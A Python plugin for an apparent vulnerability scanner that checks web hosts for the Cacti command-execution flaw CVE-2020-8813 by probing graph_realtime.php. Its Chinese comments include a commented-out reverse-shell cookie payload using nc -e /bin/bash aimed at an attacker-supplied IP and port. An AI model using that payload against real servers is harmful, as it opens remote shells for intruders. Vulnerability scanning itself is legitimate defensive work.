#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
import requests
from ClassCongregation import VulnerabilityDetails,WriteFile,ErrorLog,ErrorHandling,UrlProcessing,Proxies

class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2020-8813" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-02-24"  # 插件编辑时间
        self.info['disclosure']='2020-2-21'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "CactiArbitraryCommandExecutionVulnerability"  # 插件名称
        self.info['name'] ='Cacti任意命令执行漏洞' #漏洞名称
        self.info['affects'] = "Cacti"  # 漏洞组件
        self.info['desc_content'] = "该漏洞主要发生在攻击者尝试将恶意代码注入Cacti中cookie变量时，在与一些字符串连接后被传递给shell_exec函数"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "升级最新的系统"  # 修复建议
        self.info['version'] = "无"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)
    scheme, url, port = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    try:
        payload="/graph_realtime.php?action=init"
        payload_url = scheme + "://" + url + ":" + str(port) + payload
        #如果要反弹shell 把IP 和port改为反弹的目标即可
        #然后请求里面价格cookie值
        # from urllib.parse import quote
        # cookies = ";nc${IFS}-e${IFS}/bin/bash${IFS}%s${IFS}%s" % (ip, port)
        # cookies = {'Cacti': quote(payload)}
        headers = {
            'User-Agent': RandomAgent,
            "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/json",
        }
        resp = requests.get(payload_url,headers=headers,timeout=6,proxies=proxies, verify=False)
        con=resp.text
        code=resp.status_code
        if code == 200 and con.find("poller_realtime.php")!=-1:
            Medusa = "{}存在Cacti任意命令执行漏洞\r\n漏洞地址:{}\r\n漏洞详情:{}\r\n".format(url,payload_url,con)
            _t = VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类